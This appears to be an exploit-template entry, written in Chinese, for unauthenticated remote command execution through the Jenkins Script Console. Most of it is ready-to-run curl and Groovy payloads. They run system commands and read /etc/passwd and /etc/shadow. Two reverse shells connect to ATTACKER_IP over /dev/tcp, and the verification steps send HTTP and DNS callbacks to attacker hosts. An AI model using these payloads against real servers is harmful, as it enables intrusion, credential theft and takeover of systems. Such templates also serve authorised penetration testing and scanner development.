---
id: JENKINS-SCRIPT-RCE
title: Jenkins Script Console 未授权远程命令执行漏洞
product: jenkins
vendor: Jenkins
version_affected: "All versions (misconfiguration)"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["Jenkins", "Dashboard [Jenkins]", "X-Jenkins"]
---

## 漏洞描述

Jenkins 内置 `/script` 页面提供 Groovy 脚本控制台，允许执行任意 Groovy 代码。当 Jenkins 未配置认证或认证被绕过时，攻击者可直接访问 Script Console 执行任意系统命令，获取服务器控制权。该漏洞影响所有 Jenkins 版本，属于配置不当导致的安全问题。

## 影响版本

- 所有 Jenkins 版本（当 Script Console 未授权可访问时）

## 前置条件

- 无需认证（Jenkins 认证未开启或被绕过）
- 可访问 Jenkins `/script` 页面

## 指纹确认

```bash
# 检查是否为 Jenkins
curl -sI http://target:8080/ | grep -iE "X-Jenkins|Dashboard"

# 检查 Script Console 是否可未授权访问
curl -s -o /dev/null -w "%{http_code}" http://target:8080/script
# 返回 200 表示可直接访问，302/403 表示需要认证
```

## 利用步骤

1. 确认 `/script` 页面可未授权访问（HTTP 200）
2. 发送 POST 请求执行 Groovy 脚本
3. 从响应中获取命令执行结果

## Payload

**基础命令执行**

```bash
# 执行 id 命令
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "id".execute().text'

# 执行 whoami
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "whoami".execute().text'

# 读取文件
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println new File("/etc/passwd").text'

# 查看网络信息
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "ifconfig".execute().text'
```

**反弹 shell**

```bash
# Bash 反弹 shell
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=["bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()'

# 通过 Runtime 执行反弹 shell
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=Runtime rt = Runtime.getRuntime(); String[] commands = ["/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]; Process proc = rt.exec(commands);'
```

**多行 Groovy 脚本（适用于复杂操作）**

```bash
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=
def cmd = "cat /etc/shadow".execute()
def output = cmd.text
println output
'
```

**Windows 环境**

```bash
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "cmd.exe /c whoami".execute().text'

curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "cmd.exe /c type C:\\Windows\\System32\\drivers\\etc\\hosts".execute().text'
```

## 验证方法

```bash
# 直接验证：检查响应中是否包含命令输出
curl -s -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "id".execute().text' | grep "uid="
# 成功标志：响应包含 uid=0(root) 或类似用户信息

# HTTP 外带验证
python3 -m http.server 8888 &
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "curl http://ATTACKER_IP:8888/script_rce".execute().text'
# 检查 HTTP 服务器日志是否收到 /script_rce 请求

# DNS 外带验证
curl -X POST "http://target:8080/script" \
  --data-urlencode 'script=println "ping -c 1 script-rce.ATTACKER_DOMAIN".execute().text'
# 检查 DNS 日志是否收到解析请求
```

## 参考链接

- https://www.jenkins.io/doc/book/managing/script-console/
- https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security
